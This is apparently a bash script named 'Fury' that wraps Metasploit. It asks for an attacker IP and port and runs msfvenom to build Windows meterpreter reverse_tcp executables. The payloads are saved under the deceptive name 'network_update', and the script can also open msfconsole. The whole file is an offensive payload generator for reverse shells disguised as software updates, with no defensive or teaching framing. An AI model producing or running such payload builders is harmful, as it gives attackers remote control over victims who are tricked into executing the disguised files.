#!/bin/bash

readonly RED="\e[1;31m"
readonly GREEN="\e[1;32m"
readonly YELLOW="\e[1;33m"
readonly RESET="\e[0m"
readonly VERSION="v.0.0.3"
readonly NOTES="Only available for Windows for now..."

echo -e "${RED}"

cat << "EOF"
    ______
   / ____/_  _________  __
  / /_  / / / / ___/ / / /
 / __/ / /_/ / /  / /_/ /
/_/    \__,_/_/   \__, /
                 /____/

EOF
echo -e "${YELLOW}Fury $VERSION"

if [ -z "$1" ]; then
	echo -e "${RED}Error. Try using a flag like -h to view help." >&2
	exit 1
elif [ "$1" == "-h" ]; then
	echo "-----------------------------------"
	echo "Use -h to view this message"
	echo "Use -gp to generate a payload"
	echo "Use -lc to launch the console"
	echo "-----------------------------------"
elif [ "$1" == "-gp" ]; then
	read -p "Enter the operating system: " OS
	read -p "Enter the architecture: " architecture
	read -p "Enter your IPv4 address: " HOST
	read -p "Enter your port: " PORT
	if [ "$OS" != "windows" ] && [ "$OS" != "linux" ]; then
		echo -e "${RED}Error. Operating system not found."
		exit 1
	elif [ "$OS" == "windows" ] && [ "$architecture" == "x64" ]; then
		echo -e "[*] Generating $OS $architecture payload...${RESET}"
		mkdir payloads
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.64b.exe
		echo -e "${GREEN}[+] Payload generated!"
	elif [ "$OS" == "windows" ] && [ "$architecture" == "x86" ]; then
		echo -e "[*] Generating $OS $architecture payload...${RESET}"
		mkdir payloads
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f exe -o payloads/network_update.32b.exe
		echo -e "${GREEN}[+] Payload generated!"
	fi
elif [ "$1" == "-lc" ]; then
	echo -e "[*] Launching console...${RESET}"
	msfconsole
	echo -e "${YELLOW}[*] Console killed."
else
	echo -e "${RED}Error. Invalid flag. Try -h to view help." >&2
	exit 1
fi
